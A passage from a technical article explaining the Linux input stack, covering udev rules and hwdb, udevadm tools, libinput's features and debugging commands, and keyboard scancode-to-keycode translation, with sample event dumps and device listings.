      &lt;item&gt;&lt;code&gt;DRIVER&lt;/code&gt;: the driver currently handling the device&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;ACTION&lt;/code&gt;: Represents whatâs happening on a device. Either&lt;code&gt;add/remove&lt;/code&gt;when the device is created or removed,&lt;code&gt;bind/unbind&lt;/code&gt;for the driver,&lt;code&gt;change&lt;/code&gt;when something happens on a device such as a state change (ex: eject, power plug, brightness),&lt;code&gt;offline/online&lt;/code&gt;for memory and cpu,&lt;code&gt;move&lt;/code&gt;when a device is renamed.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;ATTR{attributename}&lt;/code&gt;: match any sysfs attribute of the device&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;TAG&lt;/code&gt;: arbitrary tags, mostly used for user-space special behavior&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;ENV{property_name}&lt;/code&gt;: Context info, device properties, added by the kernel or other udev rules associated to device. They are not environment variables, but do get passed as&lt;code&gt;env&lt;/code&gt;to&lt;code&gt;RUN+=&lt;/code&gt;commands.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;PROGRAM&lt;/code&gt;and&lt;code&gt;RESULT&lt;/code&gt;: The first executes an external program and if itâs successful then the match is ok, the second checks the string result of the last program and uses it as a comparator.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Still, there are variants of some of the above to allow a match with any of the parents of the devices in the topological hierarchy, these include &lt;code&gt;KERNELS&lt;/code&gt;, &lt;code&gt;SUBSYSTEMS&lt;/code&gt;, &lt;code&gt;DRIVERS&lt;/code&gt;, and &lt;code&gt;ATTRS&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Now, weâve dealt with the keys used for comparison, letâs see the common assignment keys:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;SYMLINK&lt;/code&gt;: A list of symlinks to be created&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;ATTR{attributename}&lt;/code&gt;: Value that should be set in sysfs&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;TAG&lt;/code&gt;: A list of special attributes for user-space to act upon. For example, systemd acts on&lt;code&gt;TAG+="systemd"&lt;/code&gt;and will read&lt;code&gt;ENV{SYSTEMD_WANTS}&lt;/code&gt;and interpret it as a unit dependency for the device. It can be used to automatically start services.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;ENV{property_name}&lt;/code&gt;: Context info, device properties, of the device. If the property name is prepended with a dot&lt;code&gt;.&lt;/code&gt;, then it will only temporarily be set.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;OWNER&lt;/code&gt;,&lt;code&gt;GROUP&lt;/code&gt;,&lt;code&gt;MODE&lt;/code&gt;: Set permissions on the device&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;RUN{type}&lt;/code&gt;: A list of external programs to run. The type is optional and defaults to âprogramâ, but it can be âbuiltinâ, which are plugins. Beware that&lt;code&gt;RUN&lt;/code&gt;will timeout, and so itâs always better to dispatch long running process to starter scripts instead that will exit directly.&lt;code&gt;systemd-run --user&lt;/code&gt;is often used here to execute things in a normal graphical session such as notifications.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;IMPORT{type}&lt;/code&gt;: Similar to&lt;code&gt;RUN&lt;/code&gt;but used to import a set of variables (&lt;code&gt;ENV&lt;/code&gt;) depending on the type, can be âprogramâ, âbuiltinâ, âfileâ, âdbâ, âparentâ, âcmdlineâ.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;LABEL&lt;/code&gt;,&lt;code&gt;GOTO&lt;/code&gt;: A label and goto to jump to it, creating branching.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The &lt;code&gt;RUN{builtin}&lt;/code&gt; is a bit of an edge-case within udev since there are
many builtin modules and most of them are blackboxes that are hardly
documented. We know from &lt;code&gt;udevadm test-builtin --help&lt;/code&gt; that these exist:&lt;/p&gt;
    &lt;code&gt;blkid           Filesystem and partition probing
btrfs           btrfs volume management
dissect_image   Dissect Disk Images
factory_reset   Factory Reset Mode
hwdb            Hardware database
input_id        Input device properties
keyboard        Keyboard scancode mapping and touchpad/pointingstick characteristics
kmod            Kernel module loader
net_driver      Set driver for network device
net_id          Network device properties
net_setup_link  Configure network link
path_id         Compose persistent device path
uaccess         Manage device node user ACL
usb_id          USB device properties
&lt;/code&gt;
    &lt;p&gt;Unfortunately, what they do isnât clear unless you step in the code of udev-builtin. For example, &lt;code&gt;input_id&lt;/code&gt;
will set a series of &lt;code&gt;ENV&lt;/code&gt; info on the device depending on what it thinks
it is. Hereâs some relevant code snippet:&lt;/p&gt;
    &lt;p&gt;And, thatâs the tip of the iceberg to understand udev rules. Yet, the ones on a real system are a monstrously big patchup. The only way to visualize all of them on your system, in the way theyâll be processed, is with &lt;code&gt;systemd-analyze cat-config udev/rules.d&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Before getting on with actual examples and tools, letâs take some time to talk about one of the most important builtin module to udev: &lt;code&gt;hwdb&lt;/code&gt;,
the harware db, or &lt;code&gt;systemd-hwdb&lt;/code&gt;. Which is an extra mechanism to write
rules for udev to add device properties (&lt;code&gt;ENV{}&lt;/code&gt;).&lt;/p&gt;
    &lt;p&gt;The hardware db is a lookup table that lives in files with the &lt;code&gt;.hwdb&lt;/code&gt;
extension under the udev directory in the &lt;code&gt;hwdb.d&lt;/code&gt; directory. These
key-values at &lt;code&gt;systemd-hwdb&lt;/code&gt; start are compiled in a &lt;code&gt;hwdb.bin&lt;/code&gt; file for
quick retrieval. They consist of matches of modalias-like keys and then
a series of assignment for properties. Something like:&lt;/p&gt;
    &lt;code&gt;bluetooth:v0000*
 ID_VENDOR_FROM_DATABASE=Ericsson Technology Licensing
&lt;/code&gt;
    &lt;p&gt;The format is a simple series of match strings, one or multiple, and then assignment values following it on lines that start with a space. Match strings can use glob for the match, theyâre not really following any specific format other than &lt;code&gt;prefix:search criteria&lt;/code&gt;. Yet, the question is:
how are these modalias-like strings used. And the answer is obviously:
itâs used by udev via its &lt;code&gt;IMPORT&lt;/code&gt; of the builtin hwdb to set certain
device properties based on the lookup. For example:&lt;/p&gt;
    &lt;p&gt;So udev passes a set of parameters to hwdb, along with the device, and it will return &lt;code&gt;ENV&lt;/code&gt; properties to set. hwdb also has an accompanying command
line tool that works in a similar way and allows querying it. However, it
has no man page, as far as I can see, but the following args are allowed:&lt;/p&gt;
    &lt;p&gt;So for example when passing &lt;code&gt;--subsystem=usb&lt;/code&gt; and a device, hwdb will get
the actual &lt;code&gt;MODALIAS&lt;/code&gt; of the device, or construct one from the &lt;code&gt;idVendor&lt;/code&gt;,
&lt;code&gt;idProduct&lt;/code&gt;, and &lt;code&gt;product&lt;/code&gt;, then try to match it in its lookup table.&lt;/p&gt;
    &lt;p&gt;Anyhow, we wonât spend time breaking down the source code. Letâs just add that since the &lt;code&gt;hwdb&lt;/code&gt; lookup table is compiled at the start, then
when entries are added or modified &lt;code&gt;systemd-hwdb&lt;/code&gt; needs to be updated
or notified via:&lt;/p&gt;
    &lt;p&gt;Similarly, the same is also true of udev. However, udev has more granular reload mechanism, either to reload rules or to re-emit events so that they can be processed by the new rules:&lt;/p&gt;
    &lt;p&gt;Letâs see more examples of &lt;code&gt;udevadm&lt;/code&gt;, which is the main way to interface
with udev.&lt;/p&gt;
    &lt;p&gt;&lt;code&gt;udevadm info&lt;/code&gt; is used to gather information about devices, weâve seen
it earlier in previous sections. Itâs handy to write udev rules. You can
pass it either a devtmpfs path, a sysfs path, a device ID, or a systemd
unit name of &lt;code&gt;.device&lt;/code&gt; type (these are the &lt;code&gt;TAG+="systemd"&lt;/code&gt; devices to
automatically load other units).&lt;/p&gt;
    &lt;p&gt;For example, we can walk and find the attribute hierarchy of a certain device.&lt;/p&gt;
    &lt;p&gt;Itâs something weâve seen before.&lt;/p&gt;
    &lt;p&gt;Another option is to rely on &lt;code&gt;udevadm monitor&lt;/code&gt;, which is a live trace
of all the uevent being sent.&lt;/p&gt;
    &lt;p&gt;Yet another option is &lt;code&gt;udevadm test&lt;/code&gt; to print the rules that will get
triggered on a certain device uevent. This is useful to check whether
the rules make sense and will get executed.&lt;/p&gt;
    &lt;p&gt;A last tip to remember when writing udev rules is that &lt;code&gt;ATTR{}&lt;/code&gt; is
anything in the files of sysfs. So we can simply match like this:&lt;/p&gt;
    &lt;code&gt;&amp;gt; cat /sys/class/input/event5/device/name
SEMICO USB Keyboard
&lt;/code&gt;
    &lt;p&gt;And the rule would be &lt;code&gt;ATTR{name}=="SEMICO USB Keyboard"&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;Finally, letâs have a honorable mention to the mdev and eudev projects, which are udev-like projects but more compatible with other init systems.&lt;/p&gt;
    &lt;head rend="h1"&gt;libinput&lt;/head&gt;
    &lt;p&gt;Libinput is a wrapper over udev and evdev. It provides a centralized way to perform device detection, device event handling, input processing, along with abstractions and common set of facilities to make the practical, and user-expected, input handling easier. Today, libinput is the major input library used by all graphical environments and toolkits, itâs used by Xorg (through a driver) and Wayland compositors, so weâre all probably using it indirectly.&lt;/p&gt;
    &lt;p&gt;Its basic mechanism works as youâd expect.&lt;lb/&gt; As far as udev is concerned, it relies on &lt;code&gt;libudev/sd-device&lt;/code&gt; to
enumerate devices and listen to kernelâs uevent. In particular, it
analyzes properties added by udev that helps categorize devices and
override settings (&lt;code&gt;ID_INPUT&lt;/code&gt;, &lt;code&gt;ID_INPUT_*&lt;/code&gt;, &lt;code&gt;LIBINPUT_*&lt;/code&gt;), and filters
which devices it is allowed to handle by looking at which âseatâ theyâre
associated with. The whole udev part can be skipped by manually passing
events with &lt;code&gt;libinput_path_add_device&lt;/code&gt;, but thatâs a fallback scenario.&lt;lb/&gt; And when it comes to evdev, it gets the handle to the corresponding input stream devices then continuously read events and processes them. This processing includes a lot of things such as scaling touch coordinate, calculating pointer acceleration, debouncing keys, etc.. Then finally, libinput returns these events in a unified API as &lt;code&gt;LIBINPUT_EVENT_POINTER_BUTTON&lt;/code&gt;, &lt;code&gt;LIBINPUT_EVENT_POINTER_MOTION&lt;/code&gt;,
and &lt;code&gt;LIBINPUT_EVENT_POINTER_MOTION_ABSOLUTE&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;That also means it handles only the usual input devices such as mice, keyboards, touchpads/clickpads, switches, trackpoints/pointing sticks, touchscreens, and graphic tablets. It doesnât handle joysticks, for example, since these arenât used for desktop environment but for games.&lt;/p&gt;
    &lt;p&gt;The main features handled by libinput are:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Button debouncing&lt;/item&gt;
      &lt;item&gt;Clickpad software button behavior, Middle button emulation&lt;/item&gt;
      &lt;item&gt;Touchpad pressure-based touch detection&lt;/item&gt;
      &lt;item&gt;Palm and thumb detection&lt;/item&gt;
      &lt;item&gt;Scrolling, Three-finger drag, and Tap-to-click behaviour&lt;/item&gt;
      &lt;item&gt;Gestures&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Weâll see what these means, but first, why is libinput needed, canât udev and evdev be handled directly? Why have another layer of indirection?&lt;/p&gt;
    &lt;p&gt;The answer is twofold: to avoid having additional separate modules in the upper stack such as in the X server, and because handling input devices is messy and not as simple as taking evdev events as-is, they need a bit more interpretation and cleanup.&lt;/p&gt;
    &lt;p&gt;Previously, before Wayland got traction, the X11 stack had specific custom drivers, the xf86 input driver API, for each type of hardware and use-case. Yet, these xf86 drivers could also have common functionalities such as two-finger scrolling, which adds confusion. This was mostly a hack for days before evdev existed, and there was a need for a library independent of X11 that would centralize this responsibility, instead of having it dispersed in different places. This makes it easier to test each options, and have the features interact with one another, cross-device communication.&lt;/p&gt;
    &lt;p&gt;Now why not handle it all directly, well because itâs messy. Multiple devices have bad firmware and might send wrong capabilities and info in their HID Report Descriptors, which will then be forwarded as-is with evdev. Plus, having handling these in the driver would be even more messy. For example, it could say that the size or resolution of the touchpad is something while itâs something else. Or that the range of valid inputs is 0 to 10 but that itâs 5-10. Thatâs why libinput includes vendor-specific quirks handling in &lt;code&gt;/usr/share/libinput/&lt;/code&gt;
along with the help of hwdb, which weâve seen earlier, that has
&lt;code&gt;/usr/lib/udev/hwdb.d/60-evdev.hwdb&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;For example:&lt;/p&gt;
    &lt;p&gt;This says that when a udev event is a usb tablet from a specific vendor, that the pressure range should be change to &lt;code&gt;70:50&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;And this says that when a keyboardâs bus is over Bluetooth, it should add the libinput attribute to say itâs an external keyboard.&lt;/p&gt;
    &lt;p&gt;The &lt;code&gt;60-evdev.hwdb&lt;/code&gt; is mostly for touchpadâs axis, the device properties
set will look like this:&lt;/p&gt;
    &lt;p&gt;Furthermore, apart from quirks, there are hardware physical issues, such as the fact that some touchpads send out events before the finger even touches them, or how to handle the difference in pressure on them, or what to do to track different fingers on multitouch (MT) hardware which requires handling evdev tracking ID and slots.&lt;/p&gt;
    &lt;p&gt;Hereâs a two-fingers scroll example, see how complex that is:&lt;/p&gt;
    &lt;code&gt;E: 0.000001 0003 0039 0557 # EV_ABS / ABS_MT_TRACKING_ID   557
E: 0.000001 0003 0035 2589 # EV_ABS / ABS_MT_POSITION_X    2589
E: 0.000001 0003 0036 3363 # EV_ABS / ABS_MT_POSITION_Y    3363
E: 0.000001 0003 003a 0048 # EV_ABS / ABS_MT_PRESSURE      48
E: 0.000001 0003 002f 0001 # EV_ABS / ABS_MT_SLOT          1
E: 0.000001 0003 0039 0558 # EV_ABS / ABS_MT_TRACKING_ID   558
E: 0.000001 0003 0035 3512 # EV_ABS / ABS_MT_POSITION_X    3512
E: 0.000001 0003 0036 3028 # EV_ABS / ABS_MT_POSITION_Y    3028
E: 0.000001 0003 003a 0044 # EV_ABS / ABS_MT_PRESSURE      44
E: 0.000001 0001 014a 0001 # EV_KEY / BTN_TOUCH            1
E: 0.000001 0003 0000 2589 # EV_ABS / ABS_X                2589
E: 0.000001 0003 0001 3363 # EV_ABS / ABS_Y                3363
E: 0.000001 0003 0018 0048 # EV_ABS / ABS_PRESSURE         48
E: 0.000001 0001 014d 0001 # EV_KEY / BTN_TOOL_DOUBLETAP   1
E: 0.000001 0000 0000 0000 # ------------ SYN_REPORT (0) ---------- +0ms
E: 0.027960 0003 002f 0000 # EV_ABS / ABS_MT_SLOT          0
E: 0.027960 0003 0035 2590 # EV_ABS / ABS_MT_POSITION_X    2590
E: 0.027960 0003 0036 3395 # EV_ABS / ABS_MT_POSITION_Y    3395
E: 0.027960 0003 003a 0046 # EV_ABS / ABS_MT_PRESSURE      46
E: 0.027960 0003 002f 0001 # EV_ABS / ABS_MT_SLOT          1
E: 0.027960 0003 0035 3511 # EV_ABS / ABS_MT_POSITION_X    3511
E: 0.027960 0003 0036 3052 # EV_ABS / ABS_MT_POSITION_Y    3052
E: 0.027960 0003 0000 2590 # EV_ABS / ABS_X                2590
E: 0.027960 0003 0001 3395 # EV_ABS / ABS_Y                3395
E: 0.027960 0003 0018 0046 # EV_ABS / ABS_PRESSURE         46
E: 0.027960 0000 0000 0000 # ------------ SYN_REPORT (0) ---------- +27ms
E: 0.051720 0003 002f 0000 # EV_ABS / ABS_MT_SLOT          0
E: 0.051720 0003 0035 2609 # EV_ABS / ABS_MT_POSITION_X    2609
E: 0.051720 0003 0036 3447 # EV_ABS / ABS_MT_POSITION_Y    3447
E: 0.051720 0003 002f 0001 # EV_ABS / ABS_MT_SLOT          1
E: 0.051720 0003 0036 3080 # EV_ABS / ABS_MT_POSITION_Y    3080
E: 0.051720 0003 0000 2609 # EV_ABS / ABS_X                2609
E: 0.051720 0003 0001 3447 # EV_ABS / ABS_Y                3447
E: 0.051720 0000 0000 0000 # ------------ SYN_REPORT (0) ---------- +24ms
[...]
E: 0.272034 0003 002f 0000 # EV_ABS / ABS_MT_SLOT          0
E: 0.272034 0003 0039 -001 # EV_ABS / ABS_MT_TRACKING_ID   -1
E: 0.272034 0003 002f 0001 # EV_ABS / ABS_MT_SLOT          1
E: 0.272034 0003 0039 -001 # EV_ABS / ABS_MT_TRACKING_ID   -1
E: 0.272034 0001 014a 0000 # EV_KEY / BTN_TOUCH            0
E: 0.272034 0003 0018 0000 # EV_ABS / ABS_PRESSURE         0
E: 0.272034 0001 014d 0000 # EV_KEY / BTN_TOOL_DOUBLETAP   0
E: 0.272034 0000 0000 0000 # ------------ SYN_REPORT (0) ---------- +30ms
&lt;/code&gt;
    &lt;p&gt;Additionally, you also have misbehaving keyboards, with bad firmware, buttons that are old, that get stuck, or send the same events multiple time (so-called contact bouncing or chatter). We need a mechanism to decide whether the event is valid or not, thatâs called hardware debouncing, and libinput does it out-of-the-box for us (see), which is truly impressive. This feature, with the help of the upper stack, may also help people that have certain disabilities with involuntary muscle movement.&lt;/p&gt;
    &lt;p&gt;So, for many reasons, libinput is indispensable!&lt;lb/&gt; Weâve already covered some of its features, letâs see more.&lt;/p&gt;
    &lt;p&gt;One of the interesting part of libinput is that itâs minimal in how it decides to access external things. As we said, you can either opt for events coming from udev, or manually pass them by path, both will create libinput internal objects (pointer, keyboard, etc..). Furthermore, libinput has no configuration files, itâs up to the caller to decide how to configure each device, as weâll see Wayland compositors and X11 have different ways. Similarly, it leaves the opening of evdev character devices up to the caller implementation, usually either manually opening it, which requires root privileges, or via &lt;code&gt;systemd-logind&lt;/code&gt; or &lt;code&gt;seatd&lt;/code&gt;, dbus
services which will automatically pass back the file descriptors of evdev
devices associated with the current âseatâ.&lt;/p&gt;
    &lt;p&gt;A seat is a collection of input devices associated with a user session. That seems redundant, since most machines have only one seat, yet it only truly makes sense in multi-seat machines: one machine, multiple input devices, with multiple users. Still, it takes this particular use-case in consideration.&lt;/p&gt;
    &lt;p&gt;As you wouldâve guessed, the safest and most favored way to get access to evdev event file descriptors is through the delegation that &lt;code&gt;systemd-logind&lt;/code&gt;
provides. This is done in the code by implementing &lt;code&gt;open_restricted&lt;/code&gt;
to call the dbus service.&lt;lb/&gt; The seat is assigned with the &lt;code&gt;ENV{ID_SEAT}&lt;/code&gt; udev property, which can be
controlled with the &lt;code&gt;loginctl&lt;/code&gt; command. To permanently attach a device
to a seat.&lt;/p&gt;
    &lt;code&gt;&amp;gt; loginctl attach 'seat0' /sys/devices/â¦/input/input174
&lt;/code&gt;
    &lt;p&gt;Then checking the device properties in udev:&lt;/p&gt;
    &lt;p&gt;There are alternatives to &lt;code&gt;logind&lt;/code&gt; such as &lt;code&gt;elogind&lt;/code&gt; and
&lt;code&gt;seatd&lt;/code&gt; that donât depend on
systemd.&lt;/p&gt;
    &lt;p&gt;Another detail is that weâve seen that the same physical device can appear as multiple input devices on the system. With the help of udev, libinput gets the device property &lt;code&gt;LIBINPUT_DEVICE_GROUP&lt;/code&gt; to group them,
like that we can have the whole group under a single seat, which is more
logical than giving access to only part of a physical hardware.&lt;/p&gt;
    &lt;p&gt;From &lt;code&gt;udevadm info&lt;/code&gt;:&lt;/p&gt;
    &lt;p&gt;And from &lt;code&gt;libinput list-devices&lt;/code&gt;, look at the &lt;code&gt;Group&lt;/code&gt; part:&lt;/p&gt;
    &lt;code&gt;Device:           SEMICO USB Keyboard
Kernel:           /dev/input/event5
Id:               usb:1a2c:6004
Group:            6
Seat:             seat0, default
Capabilities:     keyboard 
â¦
Device:           SEMICO USB Keyboard Consumer Control
Kernel:           /dev/input/event6
Id:               usb:1a2c:6004
Group:            6
Seat:             seat0, default
Capabilities:     keyboard pointer 
â¦
Device:           SEMICO USB Keyboard System Control
Kernel:           /dev/input/event7
Id:               usb:1a2c:6004
Group:            6
Seat:             seat0, default
Capabilities:     keyboard 
&lt;/code&gt;
    &lt;p&gt;You can get more info on this by checking the related udev rule in &lt;code&gt;80-libinput-device-groups.rules&lt;/code&gt;, which calls the built-in program
&lt;code&gt;libinput-device-group&lt;/code&gt; with the sysfs mount point. The &lt;code&gt;IMPORT{program}&lt;/code&gt;
basically uses a program right within &lt;code&gt;/usr/lib/udev/&lt;/code&gt; directory.&lt;/p&gt;
    &lt;p&gt;As far as the technical features are concerned, there are the ones which we listed earlier, so letâs explain the rest of them.&lt;/p&gt;
    &lt;p&gt;It offers full clickpad management. A clickpad (&lt;code&gt;INPUT_PROP_BUTTONPAD&lt;/code&gt;)
is basically a touchpad with a single button, which we might not notice at
first because depending on where we press in the âsoftware button areaâ
at the bottom, we have different behavior. Thatâs exactly the behavior
that libinput facilitates. It also handles what happens when a finger
enters or exits that area, these sort of edge cases.&lt;/p&gt;
    &lt;p&gt;Furthermore, libinput handles tap to click, be it one-finger tap for left click, two-fingers for right click, and three-fingers tap for middle click. While that seems simple in theory, libinput has to draw the line between what is considered a tap and what is considered a finger drag/move; indeed, our fingers arenât very stable in the real world.&lt;lb/&gt; Unfortunately, by default libinput disables tapping when there are other methods to trigger button clicks, but it can always be enabled again.&lt;/p&gt;
    &lt;p&gt;When talking about multiple fingers, the hardware needs to support it obviously, but also libinput needs to track each one individually, which is done via evdev tracking ID and slots, what we call multi-touch handling or MT.&lt;lb/&gt; Within multi-touch we have the concept of âgesturesâ and libinput supports two standard ones: swiping, fingers going in the same direction, and pinching when fingers move apart or towards each others.&lt;/p&gt;
    &lt;p&gt;Similarly, thereâs also different scrolling use-cases that are supported by libinput: two-fingers scrolling, similar to a swipe, edge scrolling, when thereâs a specific area on the trackpad used for scrolling, and on-button scrolling, which scrolls while having a button pressed just by moving the finger.&lt;lb/&gt; The scrolling can either be horizontal or vertical. The user also has a choice between natural scrolling an traditional scrolling; natural scrolling matches the motion of the scroll like a phone, and traditional scrolling matches the scroll bar directin so going downward will move the page downward.&lt;lb/&gt; One thing libinput doesnât provide when it comes to scrolling is kinetic scrolling. Basically, scrolling that is faster or slower depending on the speed. However, it allows widget libraries to implement it by relying on the &lt;code&gt;libinput_event_pointer_get_axis_source()&lt;/code&gt; function.&lt;/p&gt;
    &lt;p&gt;With all these, libinput offers palm and thumb detection to disable the clickpad/touchpad when typing, or ignore a thumb in the corner or accidental touches while other fingers are moving. It achieves this by detecting the different pressure, speed, or touch sizes reported by evdev, along with where they are happening (exclusion zones).&lt;lb/&gt; Itâs also possible to automatically disable the touchpad when typing, or when the lid is closed.&lt;/p&gt;
    &lt;p&gt;Lastly, libinput has lua plugins in &lt;code&gt;/usr/lib/libinput/plugins/&lt;/code&gt; and
&lt;code&gt;/etc/libinput/plugins&lt;/code&gt;. As with other quirk fixing mechanisms in
udev and the quirk directory, the plugins are there for the last few
unfixable issues. They can be used to override evdev events.&lt;/p&gt;
    &lt;p&gt;For example, the above script will reverse the horizontal scroll wheel (&lt;code&gt;EV_REL.REL_HWHEEL&lt;/code&gt;) event value for a certain device vendor and
product ID.&lt;/p&gt;
    &lt;p&gt;Weâve covered most of the libinput features, now letâs see how to debug and interface with it.&lt;/p&gt;
    &lt;p&gt;The main command line interface is &lt;code&gt;libinput&lt;/code&gt;, as weâve seen it can allow
to &lt;code&gt;list-devices&lt;/code&gt;, which is a quick summary of the devices it knows about
and on which seat they are connected. Yet most other commands are there
for debugging and testing.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;code&gt;libinput debug-gui&lt;/code&gt;: is a graphical tool mostly to debug touchpad&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;libinput debug-events&lt;/code&gt;: is a cli tool to debug all events as they are interpreted by libinput, if you want itâs similar to&lt;code&gt;evtest&lt;/code&gt;or&lt;code&gt;xev&lt;/code&gt;in Xorg&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;libinput record&lt;/code&gt;and&lt;code&gt;libinput replay&lt;/code&gt;: Used to save and then simulate again devices. This is amazing if you have a bug and want others to be able to replicate it on their machines. This is similar to how&lt;code&gt;hid-tools&lt;/code&gt;work.&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;libinput measure&lt;/code&gt;: mostly used for touchpad, to measure things such as pressure, touch size, tap to click time, etc..&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;The other way to interface with libinput is programmatically. Hereâs the most simple complete example I could come up with:&lt;/p&gt;
    &lt;p&gt;And to compile it:&lt;/p&gt;
    &lt;p&gt;But what about configuring devices, setting up things that we want to setup per device. Well, as weâve said this is done in the upper stack since libinput has no configuration files, and weâll cover this later. For now letâs just list a few of the things that can actually be configured.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;tap-to-click related, such as how many fingers are supported&lt;/item&gt;
      &lt;item&gt;three-finger drag&lt;/item&gt;
      &lt;item&gt;pointer acceleration profiles&lt;/item&gt;
      &lt;item&gt;scrolling method natural vs traditional&lt;/item&gt;
      &lt;item&gt;left-hand mode&lt;/item&gt;
      &lt;item&gt;middle button emulation&lt;/item&gt;
      &lt;item&gt;click method&lt;/item&gt;
      &lt;item&gt;disable while typing (DWT)&lt;/item&gt;
      &lt;item&gt;disable while trackpointing (DWTP)&lt;/item&gt;
      &lt;item&gt;direct-input device calibration&lt;/item&gt;
      &lt;item&gt;rotation confs (if touchpad is sideways)&lt;/item&gt;
      &lt;item&gt;area confs&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;You can glimpse at these on X11 with the command &lt;code&gt;xinput --list-props &amp;lt;device_id&amp;gt;&lt;/code&gt;
or at &lt;code&gt;libinput list-devices&lt;/code&gt; which weâve seen earlier that
should show the conf per-device:&lt;/p&gt;
    &lt;code&gt;Device:                  SYNA801A:00 06CB:CEC6 Touchpad
â¦
Group:                   1
Seat:                    seat0, default
Size:                    122x69mm
Capabilities:            pointer gesture
Tap-to-click:            disabled
Tap-and-drag:            enabled
Tap button map:          left/right/middle
Tap drag lock:           disabled
Left-handed:             disabled
Nat.scrolling:           disabled
Middle emulation:        disabled
Calibration:             n/a
Scroll methods:          *two-finger edge
Scroll button:           n/a
Scroll button lock:      n/a
Click methods:           *button-areas clickfinger
Clickfinger button map:  left/right/middle
Disable-w-typing:        enabled
Disable-w-trackpointing: enabled
Accel profiles:          flat *adaptive custom
Rotation:                n/a
Area rectangle:          n/a

// or another touchpad
Device:                  ETPS/2 Elantech Touchpad
â¦
Seat:                    seat0, default
Size:                    102x74mm
Capabilities:            pointer gesture
Tap-to-click:            disabled
Tap-and-drag:            enabled
Tap button map:          left/right/middle
Tap drag lock:           disabled
Left-handed:             disabled
Nat.scrolling:           disabled
Middle emulation:        disabled
Calibration:             n/a
Scroll methods:          *two-finger edge 
Scroll button:           n/a
Scroll button lock:      n/a
Click methods:           *button-areas clickfinger 
Clickfinger button map:  left/right/middle
Disable-w-typing:        enabled
Disable-w-trackpointing: enabled
Accel profiles:          flat *adaptive custom
Rotation:                n/a
Area rectangle:          n/a
&lt;/code&gt;
    &lt;p&gt;Thatâs about it when it comes to libinput. Now we can move to more specific things in the upper stack.&lt;/p&gt;
    &lt;head rend="h1"&gt;Keyboard Specifics&lt;/head&gt;
    &lt;p&gt;Weâre pretty much done with the lower part of the user-space stack, but before moving on to the graphical library widgets and desktop environments, letâs take some time to see some of the specific device handling that are good to know about, namely keyboards, mice, and gamepads.&lt;lb/&gt; In this section weâll see three important concepts related to keyboards: scancodes to keycodes, console keyboard handling, and XKB.&lt;/p&gt;
    &lt;head rend="h2"&gt;Scancodes to Keycodes&lt;/head&gt;
    &lt;p&gt;Like other input drivers, the role of keyboard drivers is to translate from raw hardware keys to events that can be normalized and interpreted by user-space. We call the raw keys scancodes, and the events ones keycodes (&lt;code&gt;/usr/include/linux/input-event-codes.h&lt;/code&gt;). Keycodes are also mapped
to key symbols in user-space unrelated to their actual keycodes, which we
call keysyms.&lt;lb/&gt; For example, a scancode can look like a random hex &lt;code&gt;0x1E&lt;/code&gt;, a kernel-mapped
event as &lt;code&gt;KEY_A&lt;/code&gt;, and a keysym will look like a symbol such as âaâ or âAâ.&lt;/p&gt;
    &lt;p&gt;Weâll talk more about keysyms mapping when we see XKB. But letâs focus on the scancodes to keycode translation for now.&lt;/p&gt;
    &lt;p&gt;When a keyboard input device registers itself in the input core (&lt;code&gt;input_register_device&lt;/code&gt;) it has to report which keycodes it supports
in its capabilities (&lt;code&gt;keybit&lt;/code&gt; capability). In general it has to set its
&lt;code&gt;keycode&lt;/code&gt;, &lt;code&gt;keycodemax&lt;/code&gt;, and &lt;code&gt;keycodesize&lt;/code&gt; fields, which are a map of
the translation of scancodes to keycodes.&lt;lb/&gt; These keymaps can either be full fledge dense keymap or sparse keymap, which means theyâre smaller and use less memory. The sparse keys are mostly used when registering a few entries such as special keys that donât need huge arrays.&lt;/p&gt;
    &lt;p&gt;If a scancode isnât found in these translation arrays, theyâre often either completely ignored, or the driver returns that itâs an unknown key.&lt;/p&gt;
    &lt;p&gt;Keyboard input devices can also optionally implement two important functions: &lt;code&gt;getkeycode&lt;/code&gt; and &lt;code&gt;setkeycode&lt;/code&gt;, which will by default retrieve
the current keymap and alter the current keymap respectively. Most drivers
fallback to the default mechanism, so this can be taken for granted.&lt;/p&gt;
    &lt;p&gt;Importantly, the &lt;code&gt;evdev&lt;/code&gt; and &lt;code&gt;kbd&lt;/code&gt; (console) handlers offer ways to call
these via ioctl interfaces, which will be propagated to the devices
theyâre currently handling. For &lt;code&gt;evdev&lt;/code&gt; itâs through &lt;code&gt;EVIOCGKEYCODE&lt;/code&gt; and
&lt;code&gt;EVIOCSKEYCODE&lt;/code&gt;, to get and set keycodes respectively. For the console
handler itâs through &lt;code&gt;KDGETKEYCODE&lt;/code&gt; and &lt;code&gt;KDSETKEYCODE&lt;/code&gt;. The exception
is that the console driver will propagate it to all handlers, and thus
indirectly to all devices on the platform.&lt;/p&gt;
